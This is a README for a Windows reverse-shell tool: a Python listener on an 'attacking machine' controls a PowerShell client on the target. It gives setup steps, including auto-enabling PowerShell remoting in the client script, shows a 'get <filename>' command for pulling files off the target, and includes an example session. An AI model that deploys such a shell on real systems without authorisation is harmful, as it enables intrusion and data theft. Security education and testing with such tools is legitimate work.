# windows-reverse-shell
A simple reverse shell for controlling a Windows machine over the same network, using Python for the attacker and PowerShell for the target. Supports remote command execution and file transfer.
This repository contains scripts to create a reverse shell to control a Windows machine over the same network using Python and PowerShell.

## Features
- **Remote Command Execution**: Execute commands on the Windows machine from a Python server.
- **File Transfer**: Retrieve files from the Windows machine to the attacking machine.
- **Automated IP Discovery**: The server broadcasts its IP to the client, simplifying the connection process.


## Getting Started

### Prerequisites
- **Python 3.x** installed on the attacking machine.
- **PowerShell** on the Windows machine with remoting enabled:
  - Run the following command to enable PowerShell remoting:
    ```powershell
    Enable-PSRemoting -Force
    ```
  - For convenience, you can add this command directly at the beginning of the `client.ps1` script to automatically enable remoting when the script runs:
    ```powershell
    Enable-PSRemoting -Force
    ```

### Installation and Setup
1. **Clone this repository**:
   ```bash
   git clone https://github.com/yourusername/reverse-shell-windows.git
   cd reverse-shell-windows
   ```
2. Run the server on the attacking machine:
- Execute the server's code: `python server.py`
- The script will autoaticall lister for broadcasts to detect the target's IP address

3. Set up the client on the Windows machine:
- Execute the client's code: .\client.ps1


### Usage
- Command Execution: Type any command (ls, cd, mkdir, pwd, whoami, ...) in the server to execute it on the Windows machine.
- File Transfer: Use the command `get <filename>` to transfer a file from the Windows machine to the attacking machine
- Exit the Szssion: Type `exit` to terminate the session

### Example Session
python3 server.py 
Listening for server IP broadcast...
Received broadcast from 192.168.0.14
C:\Users\camil.caudron\Desktop > ls
html
Camil - Chrome.lnk
client.ps1
FL Studio.lnk
ports.txt
Spotify.lnk
Spyder.lnk

C:\Users\camil.caudron\Desktop > get ports.txt
File 'ports.txt' received and saved.
C:\Users\camil.caudron\Desktop > exit
Exiting...

### Security Considerations
Please ensure that this script is used responsibly and only in controlled environments, such as for educational purposes or in a security testing setup. Do not use this script without explicit permission from the owner of the system you are testing. Unauthorized access to systems is illegal and unethical.
